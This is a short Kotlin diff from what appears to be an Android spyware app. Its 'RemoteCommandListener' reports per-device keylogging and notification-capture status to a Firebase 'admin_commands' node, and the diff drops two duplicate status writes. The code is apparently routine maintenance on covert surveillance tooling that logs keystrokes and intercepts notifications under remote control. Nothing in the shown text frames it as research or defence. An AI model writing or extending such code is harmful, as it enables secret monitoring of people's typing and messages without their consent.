@@ -69,8 +69,6 @@ object RemoteCommandListener {
         try {
             val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
             val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
-            ref.child("status").child("keylogging").setValue(KeyloggingConfig.isEnabled)
-            ref.child("status").child("notifications").setValue(NotificationConfig.isEnabled)
             ref.child("keylogging").setValue(KeyloggingConfig.isEnabled)
             ref.child("notifications").setValue(NotificationConfig.isEnabled)
         } catch (e: Exception) {
